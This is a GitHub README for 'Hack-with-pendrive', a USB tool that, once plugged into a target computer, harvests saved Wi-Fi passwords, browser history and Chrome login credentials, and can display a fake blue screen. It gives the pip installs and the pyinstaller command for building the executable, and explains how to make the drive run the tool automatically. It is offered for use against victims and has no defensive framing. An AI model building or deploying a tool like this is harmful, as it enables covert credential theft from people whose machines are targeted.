# Hack-with-pendrive
just plug in your pen and BOOM!

# Demonstation 
I plugged in the pendrive, and this is what it does.

https://user-images.githubusercontent.com/36286877/127731137-c9c871cc-6e6d-4f95-9540-d7fd4332d683.mp4

# Added Lately
I added three new features ( two are disabled by default, in the connfig file )
  1. IP Config data ( "ipconfig /all" )
  2. System Info - Disabled by default
  2. Fake BSOD - Disabled by default

# All Features
You plug in the pendrive, all the needed information will be retrieved from the target computer! Everything that this software collects is mentioned below!
  1. All Wi-Fi Passwords of connected networks
  2. Web Browser Histroy ( of almost all browsers )
  3. Login Passwords Saved in Chrome ( the default and the first 10 profiles )
  4. IP Config Information ( "ipconfig /all" )
  5. System Info - Disabled by default ( "systeminfo" )
  6. Fake BSOD - Disabled by default


# Editing the `config.json`

![image](https://user-images.githubusercontent.com/36286877/127732910-fae06dea-f5eb-4854-915f-28c08022b776.png)
![image](https://user-images.githubusercontent.com/36286877/127732918-dc3f9e70-3792-4a59-b80a-974704725898.png)

( "yes" for true and "no" for false ) - These are the main useful things in this file :)

# How to compile ( from `.py` to `.exe` )
Run these commands to make it working
```
pip install win32crypt
pip install pypiwin32
pip install pycryptodome

pip install browser-history
# or
pip install browser-history
```
or Run this command
```
python install.py
```
and finally,


Run this command to make a `.exe` our of the `runall.py` file
```
pyinstaller --noconfirm --onefile --console --icon "logo.ico" "runall.py"
```

# Make the file autorun
For this, you need a third party software: 
  1. Link 1 - https://www.samlogic.net/usb-autorun-creator/usb-autorun-creator.htm
  2. Link 2 - https://download.cnet.com/SamLogic-USB-AutoRun-Creator/3000-2094_4-75724123.html
  3. Link 3 - https://www.softpedia.com/get/System/System-Miscellaneous/USB-AutoRun-Creator.shtml
  
Visit one of the above links and download the SamLogic USB AutoRun Creator and install it!

![image](https://user-images.githubusercontent.com/36286877/127734445-f196d1a0-3d30-4788-a14e-9a38bd061272.png)

Select the file .exe file inside the `dist` folder ( after compiling with pyinstaller ), select the pendrive and Click on the USB device you have plugged in, Enter any name as the Label and finally click `Create`. Wait some time for the software to generate and copy the necessary files.

### YOU ARE DONE!
